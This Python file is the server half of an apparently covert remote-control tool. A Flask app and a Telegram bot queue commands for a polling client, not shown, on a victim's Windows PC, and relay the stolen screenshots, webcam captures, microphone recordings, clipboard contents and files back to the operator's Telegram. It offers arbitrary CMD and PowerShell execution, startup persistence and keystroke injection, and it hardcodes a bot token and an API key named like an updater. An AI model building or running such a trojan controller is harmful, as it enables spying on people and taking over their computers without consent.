import telebot, os, time, datetime, threading
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, abort, jsonify, send_file
from werkzeug.utils import secure_filename

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8712749832:AAGnChNQus7mqp_2qQuMfK4-JNiorGGkkns")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "7637946765"))
API_KEY = os.environ.get("API_KEY", "wupdater2026secret")
RENDER_URL = os.environ.get("RENDER_URL", "")
PORT = int(os.environ.get("PORT", "5000"))

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
app = Flask(__name__)

pending_commands = []
pc_status = {"online": False, "last_seen": None, "count": 0}
UPLOAD_DIR = "/tmp/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)
cmd_id = 0
user_state = {}  # chat_id -> {"waiting": "cmd"/"msg"/etc}

# ---- PAGES (8 buttons + arrows) ----
PAGES = [
    [("📸 Скрин", "screen"), ("ℹ️ Инфо", "info"),
     ("📋 Процессы", "procs"), ("📂 Файлы", "ls:"),
     ("📋 Буфер", "clip"), ("💬 Сообщение", "ask_msg"),
     ("⚡ CMD", "ask_cmd"), ("🔒 Блокировка", "lock")],

    [("🖱 Клик мыши", "ask_click"), ("🖱 Двигать мышь", "ask_mouse"),
     ("⌨️ Клавиша", "ask_key"), ("🔊 Громкость +", "volume:up"),
     ("🔉 Громкость -", "volume:down"), ("🔇 Без звука", "volume:mute"),
     ("🎤 Запись 5сек", "record:5"), ("🎥 Вебкамера", "webcam")],

    [("🚀 Запустить", "ask_run"), ("📦 Переместить", "ask_move"),
     ("🔍 Поиск папки", "ask_search"), ("📥 Скачать файл", "ask_dl"),
     ("💀 Выключить", "shutdown"), ("🔄 Перезагрузка", "restart"),
     ("🏠 Автозагрузка", "startup"), ("📊 Статус", "status")],

    [("🔐 Шифровать", "ask_encrypt"), ("🔓 Расшифровать", "ask_decrypt"),
     ("⚡ PowerShell", "ask_ps"), ("📝 Путь сменить", "ask_cd"),
     ("🗑 Убить процесс", "ask_kill"), ("🖥 Скрин области", "screen"),
     ("📤 Push-уведомл.", "ask_push"), ("🔙 В начало", "page:0")],
]

def menu_kb(page=0):
    kb = InlineKeyboardMarkup(row_width=2)
    for i in range(0, len(PAGES[page]), 2):
        row = PAGES[page][i:i+2]
        kb.row(*[InlineKeyboardButton(t, callback_data=d) for t, d in row])
    # Navigation
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️ Назад", callback_data=f"page:{page-1}"))
    nav.append(InlineKeyboardButton(f"{page+1}/{len(PAGES)}", callback_data="noop"))
    if page < len(PAGES)-1: nav.append(InlineKeyboardButton("Вперёд ➡️", callback_data=f"page:{page+1}"))
    kb.row(*nav)
    return kb

def status_text():
    s = "🟢 Онлайн" if pc_status["online"] else "🔴 Оффлайн"
    t = pc_status.get("last_seen", "—")
    return f"🖥 <b>Управление ПК</b>\n\nСтатус: {s}\nПоследний раз: {t}"

# ---- FLASK ----
@app.route('/')
def index():
    s = "Online" if pc_status["online"] else "Offline"
    return f"<h2>PC Remote</h2><p>PC: {s}</p>", 200

@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def webhook():
    if request.content_type == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return '', 200
    abort(403)

@app.route('/api/poll')
def api_poll():
    if request.args.get('key') != API_KEY: abort(403)
    pc_status["online"] = True
    pc_status["last_seen"] = datetime.datetime.now().strftime("%H:%M:%S")
    cmds = list(pending_commands); pending_commands.clear()
    return jsonify({"commands": cmds})

@app.route('/api/result', methods=['POST'])
def api_result():
    k = request.form.get('key') or (request.json or {}).get('key')
    if k != API_KEY: abort(403)
    try:
        if request.content_type and 'json' in request.content_type:
            bot.send_message(ADMIN_ID, (request.json or {}).get('text', ''))
        else:
            t = request.form.get('text', '')
            if t:
                if len(t) > 4000: t = t[:4000] + "\n..."
                bot.send_message(ADMIN_ID, t)
    except Exception as e: print(f"Err: {e}")
    return "ok"

@app.route('/api/photo', methods=['POST'])
def api_photo():
    if request.form.get('key') != API_KEY: abort(403)
    try:
        f = request.files.get('photo')
        if f:
            p = os.path.join(UPLOAD_DIR, "s.jpg"); f.save(p)
            with open(p, 'rb') as x: bot.send_photo(ADMIN_ID, x)
            os.remove(p)
    except Exception as e: print(f"Err: {e}")
    return "ok"

@app.route('/api/file', methods=['POST'])
def api_file():
    if request.form.get('key') != API_KEY: abort(403)
    try:
        f = request.files.get('file')
        fn = request.form.get('filename', 'file')
        if f:
            p = os.path.join(UPLOAD_DIR, secure_filename(fn)); f.save(p)
            with open(p, 'rb') as x: bot.send_document(ADMIN_ID, x, visible_file_name=fn)
            os.remove(p)
    except Exception as e: print(f"Err: {e}")
    return "ok"

@app.route('/api/audio', methods=['POST'])
def api_audio():
    if request.form.get('key') != API_KEY: abort(403)
    try:
        f = request.files.get('audio')
        if f:
            p = os.path.join(UPLOAD_DIR, "rec.wav"); f.save(p)
            with open(p, 'rb') as x: bot.send_audio(ADMIN_ID, x, title="Recording")
            os.remove(p)
    except Exception as e: print(f"Err: {e}")
    return "ok"

@app.route('/api/download')
def api_download():
    if request.args.get('key') != API_KEY: abort(403)
    for fn in os.listdir(UPLOAD_DIR):
        if fn.startswith("for_pc_"):
            return send_file(os.path.join(UPLOAD_DIR, fn), download_name=fn[7:], as_attachment=True)
    return jsonify({"file": None})

# ---- Queue ----
def q(cmd):
    global cmd_id; cmd_id += 1
    pending_commands.append({"id": cmd_id, "cmd": cmd})

# ---- CALLBACK HANDLER ----
@bot.callback_query_handler(func=lambda c: True)
def cb(call):
    if call.message.chat.id != ADMIN_ID: return
    d = call.data
    bot.answer_callback_query(call.id)

    if d.startswith("page:"):
        p = int(d[5:])
        bot.edit_message_text(status_text(), call.message.chat.id, call.message.message_id,
                              parse_mode='HTML', reply_markup=menu_kb(p))
    elif d == "noop": return
    elif d == "screen": q("screen"); bot.send_message(ADMIN_ID, "📸 Скрин...")
    elif d == "info": q("info")
    elif d == "procs": q("procs")
    elif d.startswith("ls:"): q(f"ls:{d[3:]}"); bot.send_message(ADMIN_ID, "📂 Загрузка...")
    elif d == "clip": q("clip")
    elif d == "lock": q("lock"); bot.send_message(ADMIN_ID, "🔒")
    elif d == "webcam": q("webcam"); bot.send_message(ADMIN_ID, "🎥 Камера...")
    elif d.startswith("volume:"): q(d)
    elif d.startswith("record:"): q(d); bot.send_message(ADMIN_ID, "🎤 Запись...")
    elif d == "shutdown": q("shutdown"); bot.send_message(ADMIN_ID, "💀")
    elif d == "restart": q("restart"); bot.send_message(ADMIN_ID, "🔄")
    elif d == "startup": q("startup")
    elif d == "status":
        s = "🟢" if pc_status["online"] else "🔴"
        bot.send_message(ADMIN_ID, f"{s} Статус: {'Онлайн' if pc_status['online'] else 'Оффлайн'}\n⏰ {pc_status.get('last_seen','—')}")
    # Ask for input
    elif d.startswith("ask_"):
        prompts = {
            "ask_cmd": "Введи CMD команду:", "ask_ps": "Введи PowerShell команду:",
            "ask_msg": "Введи текст сообщения:", "ask_click": "Введи координаты: x,y",
            "ask_mouse": "Введи координаты: x,y", "ask_key": "Введи клавишу (напр: enter, space, a, f5):",
            "ask_run": "Введи путь к файлу:", "ask_move": "Введи: откуда > куда",
            "ask_search": "Введи имя папки:", "ask_dl": "Введи путь к файлу:",
            "ask_cd": "Введи путь:", "ask_kill": "Введи PID:",
            "ask_encrypt": "Введи текст для шифрования:", "ask_decrypt": "Введи текст для расшифровки:",
            "ask_push": "Введи текст уведомления:",
        }
        bot.send_message(ADMIN_ID, prompts.get(d, "Введи данные:"))
        user_state[ADMIN_ID] = {"waiting": d[4:]}  # Remove "ask_" prefix

# ---- TEXT HANDLER ----
@bot.message_handler(commands=['start', 'help', 'menu'])
def cmd_start(msg):
    if msg.chat.id != ADMIN_ID: return
    bot.send_message(msg.chat.id, status_text(), parse_mode='HTML', reply_markup=menu_kb(0))

@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID and m.text and m.text.startswith('/'))
def cmd_slash(msg):
    t = msg.text
    if t.startswith("/cmd "): q(f"cmd:{t[5:]}"); bot.send_message(msg.chat.id, "⏳")
    elif t.startswith("/ps "): q(f"ps:{t[4:]}"); bot.send_message(msg.chat.id, "⏳")
    elif t == "/screen": q("screen")
    elif t == "/info": q("info")
    elif t == "/procs": q("procs")
    elif t.startswith("/kill "): q(f"kill:{t[6:]}")
    elif t.startswith("/ls"): q(f"ls:{t[4:].strip()}")
    elif t.startswith("/cd "): q(f"cd:{t[4:]}")
    elif t.startswith("/dl "): q(f"dl:{t[4:]}")
    elif t == "/clip": q("clip")
    elif t.startswith("/msg "): q(f"msg:{t[5:]}")
    elif t == "/lock": q("lock")
    elif t == "/shutdown": q("shutdown")
    elif t == "/restart": q("restart")
    elif t == "/menu": bot.send_message(msg.chat.id, status_text(), parse_mode='HTML', reply_markup=menu_kb(0))

@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID, content_types=['text'])
def handle_text(msg):
    state = user_state.pop(ADMIN_ID, None)
    if not state: return
    w = state["waiting"]
    t = msg.text
    if w == "cmd": q(f"cmd:{t}"); bot.send_message(msg.chat.id, f"⚡ {t}")
    elif w == "ps": q(f"ps:{t}"); bot.send_message(msg.chat.id, f"⚡ PS: {t}")
    elif w == "msg": q(f"msg:{t}"); bot.send_message(msg.chat.id, "💬 Отправлено")
    elif w == "click": q(f"click:{t}"); bot.send_message(msg.chat.id, f"🖱 Клик: {t}")
    elif w == "mouse": q(f"mouse:{t}"); bot.send_message(msg.chat.id, f"🖱 Мышь: {t}")
    elif w == "key": q(f"key:{t}"); bot.send_message(msg.chat.id, f"⌨️ Клавиша: {t}")
    elif w == "run": q(f"run:{t}"); bot.send_message(msg.chat.id, f"🚀 Запуск: {t}")
    elif w == "move": q(f"move:{t}"); bot.send_message(msg.chat.id, f"📦 Перемещение")
    elif w == "search": q(f"search:{t}"); bot.send_message(msg.chat.id, f"🔍 Ищу: {t}")
    elif w == "dl": q(f"dl:{t}"); bot.send_message(msg.chat.id, f"📥 Скачиваю")
    elif w == "cd": q(f"cd:{t}")
    elif w == "kill": q(f"kill:{t}")
    elif w == "encrypt": q(f"encrypt:{t}"); bot.send_message(msg.chat.id, "🔐")
    elif w == "decrypt": q(f"decrypt:{t}"); bot.send_message(msg.chat.id, "🔓")
    elif w == "push": q(f"push:{t}"); bot.send_message(msg.chat.id, "📤 Push отправлен")

@bot.message_handler(content_types=['document'])
def handle_doc(msg):
    if msg.chat.id != ADMIN_ID: return
    try:
        fi = bot.get_file(msg.document.file_id)
        data = bot.download_file(fi.file_path)
        fname = "for_pc_" + (msg.document.file_name or "file")
        with open(os.path.join(UPLOAD_DIR, fname), 'wb') as f: f.write(data)
        q(f"upload:{msg.document.file_name or 'file'}")
        bot.send_message(msg.chat.id, f"📤 → ПК: {msg.document.file_name}")
    except Exception as e: bot.send_message(msg.chat.id, f"Err: {e}")

# ---- Timeout ----
def timeout_check():
    while True:
        time.sleep(15)
        if pc_status["online"] and pc_status["last_seen"]:
            try:
                last = datetime.datetime.strptime(pc_status["last_seen"], "%H:%M:%S")
                now = datetime.datetime.now()
                last = last.replace(year=now.year, month=now.month, day=now.day)
                if (now - last).total_seconds() > 20: pc_status["online"] = False
            except: pass
threading.Thread(target=timeout_check, daemon=True).start()

# ---- Start ----
if RENDER_URL:
    try: bot.remove_webhook(); time.sleep(0.5); bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
    except: pass

if __name__ == "__main__":
    if RENDER_URL:
        app.run(host='0.0.0.0', port=PORT)
    else:
        bot.remove_webhook()
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
        while True:
            try: bot.polling(non_stop=True, interval=1, timeout=60)
            except: time.sleep(5)
